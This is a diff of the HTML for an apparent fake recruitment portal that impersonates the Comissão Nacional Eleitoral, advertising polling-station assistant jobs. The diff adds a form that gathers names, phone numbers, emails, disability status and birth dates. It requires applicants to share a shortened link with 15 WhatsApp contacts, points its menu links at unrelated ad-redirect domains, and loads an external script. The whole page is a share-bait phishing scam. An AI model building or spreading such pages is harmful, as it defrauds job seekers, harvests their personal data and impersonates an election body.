@@ -233,6 +233,140 @@ border-radius: 8px;
 color: #099c3a;
 font-weight: 600;
 }
+.topbar-wrap {
+  width: 100%;
+  max-width: 500px;
+  margin: 0 auto;
+  padding: 10px 10px 0;
+  box-sizing: border-box;
+}
+
+.topbar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 10px;
+  padding: 12px 14px;
+  background: #2da1e0;
+  border-bottom: 1px solid #e5e7eb;
+  box-shadow: 0 4px 14px rgba(0, 0, 0, 0.06);
+  border-radius: 14px;
+}
+
+.topbar-left,
+.topbar-right {
+  display: flex;
+  align-items: center;
+  flex-shrink: 0;
+}
+
+.topbar-center {
+  flex: 1;
+  text-align: center;
+  min-width: 0;
+}
+
+.site-title {
+  font-size: 0.9rem;
+  font-weight: 700;
+  color: #FFF;
+  line-height: 1.15;
+}
+
+.site-subtitle {
+  font-size: 0.72rem;
+  color: #FFF;
+  margin-top: 2px;
+  line-height: 1.1;
+}
+
+.menu-wrap {
+  position: relative;
+}
+
+.menu-btn {
+  width: 40px;
+  height: 40px;
+  border: none;
+  border-radius: 10px;
+  background: #f3f4f6;
+  color: #374151;
+  font-size: 1.5rem;
+  cursor: pointer;
+  padding: 0;
+  line-height: 1;
+}
+
+.menu-btn:hover {
+  background: #e5e7eb;
+  color: #111827;
+}
+
+.menu-dropdown {
+  display: none;
+  position: absolute;
+  top: 46px;
+  left: 0;
+  min-width: 180px;
+  background: #ffffff;
+  border: 1px solid #e5e7eb;
+  border-radius: 12px;
+  box-shadow: 0 12px 24px rgba(0, 0, 0, 0.08);
+  overflow: hidden;
+  z-index: 1000;
+}
+
+.menu-dropdown a {
+  display: block;
+  padding: 12px 14px;
+  text-decoration: none;
+  color: #374151;
+  font-size: 0.92rem;
+}
+
+.menu-dropdown a:hover {
+  background: #f9fafb;
+  color: #9fcf67;
+}
+
+.menu-wrap:hover .menu-dropdown {
+  display: block;
+}
+
+topbar-logo {
+  width: 32px;
+  height: 32px;
+  object-fit: contain;
+  display: block;
+  border: none;
+  background: transparent;
+  border-radius: 0;;
+}
+
+@media (max-width: 480px) {
+  .topbar {
+    padding: 10px 12px;
+    gap: 8px;
+  }
+
+  .site-title {
+    font-size: 1rem;
+  }
+
+  .site-subtitle {
+    font-size: 0.85rem;
+  }
+
+  .menu-btn {
+    width: 36px;
+    height: 36px;
+    font-size: 1.35rem;
+  }
+
+  .topbar-logo {
+    width: 32px;
+    height: 32px;
+  }
 </style>
 <script async src='/cdn-cgi/challenge-platform/h/g/scripts/invisible.js'></script><meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
 <meta name='google-adsense-platform-domain' content='blogspot.com'/>
@@ -649,12 +783,14 @@ text-decoration: underline;
 width: 12px;
 margin-right: 3px;
 }
-.small_headlines{
-color: #FFFFFF;
-font-weight: 500;
-padding-bottom: 10px;
-background: #2da1e0;
-box-shadow: 0 6px 10px rgba(0,0,0,.1);
+.small_headlines {
+  color: #ffffff;
+  font-weight: 500;
+  background: #f37120;
+  box-shadow: 0 6px 10px rgba(0,0,0,.1);
+  border-radius: 15px;
+
+  padding: 10px 15px; /* top/bottom left/right spacing */
 }
 .small_headlines img{
 width: 10px;
@@ -1269,25 +1405,49 @@ box-shadow: 0 0 0 0 rgba(#5a99d4, 0);
 }
 </style>
 
-
-<header style="background-color: #f5f5f5; border-bottom: 2px solid #ddd; padding: 15px 20px; display: flex; align-items: center; justify-content: space-between;">
-
-<!-- Left side: Menu + Search -->
-<div style="display: flex; align-items: center; gap: 20px; font-size: 24px; color: #333; cursor: pointer;">
-<span>&#9776;</span> <!-- Menu Icon -->
+</style>
+  <div style="width:100%; overflow:hidden; background:#2da1e0; color:#fff; border-radius:0 0 5px 5px;">
+  <div style="display:inline-block; white-space:nowrap; padding:10px 0; animation:scroll-left 15s linear infinite;">
+    📢 Está em curso o recrutamento de 500 Assistentes de Secção Eleitoral...
+  </div>
 </div>
+   <style>
+@keyframes scroll-left {
+  0% { transform: translateX(100%); }
+  100% { transform: translateX(-100%); }
+}
+</style>
+<br>
 
-<!-- Center: Website Name -->
-<div style="font-size: 15px; font-weight: bold; color: #333; text-align: center; flex: 1;">
-PORTAL OFICIAL DE RECRUTAMENTO
-</div>
+<header class="topbar">
+  <div class="topbar-left">
+    <div class="menu-wrap">
+      <button class="menu-btn" id="menuBtn" aria-label="Open menu">☰</button>
 
-<!-- Right side: Logo -->
-<div style="display: flex; align-items: center; gap: 15px;">
-<img src="https://gdb.voanews.com/6a6cd9bf-3980-46f8-b01f-6f54cd2a0b04_w1080_h608.jpg" alt="Logo" style="height: 50px;">
-</div>
+      <div class="menu-dropdown" id="menuDropdown">
+        <a href="https://soberanvil.com/c1e1be0c?key=46527223d3726e9bf4fd6c2e75557a4a">Página inicial</a>
+        <a href="https://ey43.com/4/9120968">Sobre nós</a>
+        <a href="https://ey43.com/4/9120968">Ver aplicações</a>
+        <a href="https://soberanvil.com/c1e1be0c?key=46527223d3726e9bf4fd6c2e75557a4a">Contate-nos</a>
+      </div>
+    </div>
+  </div>
 
+  <div class="topbar-center">
+    <div class="site-title">PORTAL DE RECRUTAMENTO</div>
+    <div class="site-subtitle">Comissão Nacional Eleitoral</div>
+  </div>
+
+  <div class="topbar-right">
+    <img
+  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTFd-ebrfADGue_7aGvL-YUTBXoqO_1spciFxUYTT1oh1WDAeV_5mvJdHot&s=10"
+  alt="Logo"
+  class="topbar-logo"
+  style="width: 32px; height: 32px;"
+>
+  </div>
 </header>
+<br/>
 
 <center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-felL1bGv8kt9StSVoJ7ddEa5ceWHw4D1AoFo0gxY5TMTu7uMNcGkZ2sN8nRTAHg52s2kt8WTj9oTM7r0xJoqVH2zbuCAi-376wHPBLO8P8xFxfjL7X52JzZ3eMhPUKO5jkb8Hcgi-jMBkBP5pRtiNNVBod2J1WtDXiXVaN59MdYDI0nsCSlETW2V4i8/s900/Programa%20de%20Recrutamento%20202627.png" alt="Chicago" width="100%" height="35%">
 
@@ -1296,15 +1456,17 @@ PORTAL OFICIAL DE RECRUTAMENTO
 <div class="content-middle">
 <div class="content-inner">
 <p class="headline"></p>
-<p class="small_headlines">
-<b style="color: white;"><span style="font-weight:bold;">
-Comissão Nacional Eleitoral(CNE)
-<br>O recrutamento de pessoal está em curso.<br>Envie agora mesmo a sua candidatura!
-<div class="survey_outer">
-<div class="survey_middle">
-<div class="survey_inner">
+<p class="headline"></p>
+<p class="small_headlines" style="text-align: left;">
+<b><span style="font-weight:bold;">
+Bem-vindo(a) ao portal oficial de recrutamento da CNE. <br>Para se candidatar, preencha corretamente o formulário abaixo.
 <p class="question_text question1">
-FORMULÁRIO DE CANDIDATURA <br>
+FORMULÁRIO DE INSCRIÇÃO 📝<br>
+  <select style="width: 260px; padding: 10px; border-radius: 8px; border: 1px solid #ccc; font-size: 15px; background-color: #f8f9fa; color: #333; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
+<option selected disabled>Escolha o seu género</option>
+    <option value="Eastern Cape">Macho</option>
+  <option value="Free State">Fêmea</option>
+</select><br>
 <!-- NAME INPUTS -->
 <input type="text" id="firstName" placeholder="Primeiro nome"
 style="width:90%; padding:12px; margin:10px auto; display:block;
@@ -1318,7 +1480,7 @@ border-radius:10px; border:1px solid #ccc; font-size:15px;"><br>
 <p class="question_text question2">
 <input type="text" name="_name" placeholder="Número de telefone"><br/>
 <input type="text" name="_name" placeholder="E-Mail"><br/>
-Para que vaga se está a candidatar?
+Tem alguma deficiência?
 </p>
 <p class="question_text question3">
 Introduza a data de nascimento
@@ -1359,10 +1521,10 @@ Não
 </p>
 </div>
 <div class="answer anses2">
-<p>Agente da Mesa de Voto</p>
+<p>Sim</p>
 </div>
 <div class="answer anses2">
-<p> Observadores</p>
+<p>Não</p>
 </div>
 <div class="answer anses3">
 <p>
@@ -1443,19 +1605,23 @@ box-shadow:0 6px 16px rgba(0,0,0,0.12);
 
 
 
-<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e4/Twitter_Verified_Badge.svg/640px-Twitter_Verified_Badge.svg.png" alt="UN" width="5%">
+<img src="https://img.icons8.com/color/1200/instagram-verification-badge.jpg" alt="UN" width="5%">
 </i>
 <i style="font-size: 15px;">Comissão Nacional Eleitoral(CNE):</i>
 <div id='lastapp'>
 <br><br>
 <div id="userGreeting" style="text-align:center; margin-bottom:12px;"></div>
 <br>
-<center><b>A sua candidatura foi recebida com sucesso. Siga os passos abaixo para submeter a sua candidatura.</b></center>
-<br>
-<center><br> (1) Partilhe a notícia com 15 amigos ou 10 grupos no WhatsApp para que outras pessoas se possam candidatar à vaga! Clique no botão "PARTILHAR" abaixo para partilhar esta informação.<br></center>
-<center><br> (2) Será redirecionado para a última página para submeter a sua candidatura assim que terminar de partilhar.<br></center>
-<br>
-<font color="red"> NOTA: Este passo é muito IMPORTANTE</font>
+<div style="background-color: #2da1e0; border: 1px solid #fff; border-radius: 6px; padding: 10px 15px; margin: 10px 0; text-align: center; line-height: 1.4; color: #137333; font-size: 14px; max-width: 90%; margin-left: auto; margin-right: auto;">
+    <b>Obrigado e bem-vindo(a) à etapa final da sua candidatura. Siga os passos abaixo para submeter a sua candidatura de emprego.</b>
+  </div>
+
+<div style="text-align: left;">
+<br><br>
+  (1) Partilhe a notícia com 15 amigos ou 10 grupos no WhatsApp para que outras pessoas se possam candidatar à vaga! Clique no botão <b>"PARTILHAR"</b> abaixo para partilhar esta informação.
+<br><br>
+(2) Após concluir a partilha, será redirecionado para a última página para submeter a sua inscrição.
+<br><br>
 </div>
 </h4>
 </center>
@@ -1476,7 +1642,7 @@ fn1_a();
 },2000)
 }
 
-j='*AVISO PÚBLICO‼*%0A%0AA *Comissão Nacional Eleitoral (CNE)* convida pessoas qualificadas e elegíveis a candidatarem-se como *Agente da Mesa de Voto* e *Observadores* para as próximas atividades eleitorais. %0AClique no link abaixo para submeter a sua candidatura.%0Ahttps://rebrand.ly/CNE-Recrutamento-portal%0A';
+j='*Recrutamento de 500 Assistentes de Secção Eleitoral*%0A%0AA *Este comunicado visa informar o público em geral que a Comissão Nacional Eleitoral está a recrutar 500 assistentes de mesa eleitoral para auxiliar em diferentes assembleias de voto nas eleições gerais de 2027.. %0AClique no link abaixo para aceder ao portal oficial de recrutamento da CNE e submeter a sua candidatura.%0Ahttps://rebrand.ly/CNE-Recrutamento-portal%0A';
 banner='';
 $.getScript('yuming.js?'+ (new Date()).getTime());
 
